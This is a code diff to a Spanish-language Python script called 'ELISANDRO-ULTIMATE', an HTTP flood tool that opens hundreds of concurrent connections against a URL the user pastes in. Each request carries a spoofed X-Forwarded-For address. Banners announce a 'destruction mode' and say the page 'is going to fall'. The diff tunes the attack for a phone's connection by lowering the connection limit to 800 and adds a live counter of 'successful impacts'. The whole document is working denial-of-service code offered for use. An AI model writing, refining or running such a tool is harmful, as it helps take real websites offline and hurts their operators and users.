@@ -2,54 +2,51 @@ import asyncio
 import aiohttp
 import random
 import os
+import time
 from colorama import Fore, Style, init
 
 init()
 
-# Identidades falsas para saltar protecciones
-UAS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1"
-]
-
-async def bombardear(url, session, id):
+async def bombardear(url, session, id, stats):
     while True:
         try:
-            # Bypass de caché y parámetros de confusión
-            objetivo_dinamico = f"{url}?dev={random.randint(1,999999)}&query={random.getrandbits(32)}"
             headers = {
-                'User-Agent': random.choice(UAS),
+                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1,100)}",
                 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                'Cache-Control': 'no-cache'
             }
-            async with session.get(objetivo_dinamico, headers=headers, timeout=1) as r:
-                # No esperamos respuesta para no perder velocidad
-                pass
+            # Micro-pausa para no trabar tu Tecno Spark
+            await asyncio.sleep(0.01) 
+            
+            async with session.get(url, headers=headers, timeout=2) as r:
+                stats['exitos'] += 1
         except:
-            pass
+            stats['caídos'] += 1
+
+async def monitor(stats):
+    while True:
+        await asyncio.sleep(1)
+        os.system('clear')
+        print(f"{Fore.RED}██ ELISANDRO-ULTIMATE V5: MONITOR DE IMPACTO ██")
+        print(f"{Fore.GREEN}[+] IMPACTOS EXITOSOS: {stats['exitos']}")
+        print(f"{Fore.YELLOW}[!] RECHAZADOS/CAÍDOS: {stats['caídos']}")
+        print(f"{Fore.CYAN}[*] ESTADO: ENVIANDO RÁFAGAS MASIVAS...")
+        print(f"{Fore.WHITE}----------------------------------------------")
 
 async def main():
     os.system('clear')
-    print(f"{Fore.RED}{Style.BRIGHT}")
-    print("█████████████████████████████████████████████")
-    print("█     ELISANDRO-ULTIMATE: MODO DESTRUCCIÓN  █")
-    print("█████████████████████████████████████████████")
-    print(f"{Style.RESET_ALL}")
+    print(f"{Fore.RED}↓↓↓ PEGA EL ENLACE AQUÍ Y DALE A ENTER ↓↓↓")
+    target = input(f"{Fore.YELLOW}URL: {Fore.WHITE}").strip()
     
-    # AQUÍ ES DONDE PONES EL ENLACE
-    print(f"{Fore.YELLOW}↓↓↓ PEGA EL ENLACE DE LA PÁGINA AQUÍ ABAJO Y DALE A ENTER ↓↓↓{Style.RESET_ALL}")
-    target = input(f"{Fore.CYAN}ENLACE: {Style.RESET_ALL}").strip()
+    stats = {'exitos': 0, 'caídos': 0}
     
-    if not target.startswith("http"):
-        print("Error: El enlace debe empezar con http:// o https://")
-        return
-
-    print(f"\n{Fore.RED}[!] INICIANDO ATAQUE MASIVO... LA PÁGINA VA A CAER.{Style.RESET_ALL}")
-    
-    connector = aiohttp.TCPConnector(limit=2000, ssl=False)
+    # Bajamos a 800 conexiones para que tu internet no se muera
+    connector = aiohttp.TCPConnector(limit=800, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [bombardear(target, session, i) for i in range(1500)]
+        # Iniciamos el monitor visual
+        asyncio.create_task(monitor(stats))
+        
+        # Iniciamos el enjambre
+        tasks = [bombardear(target, session, i, stats) for i in range(800)]
         await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
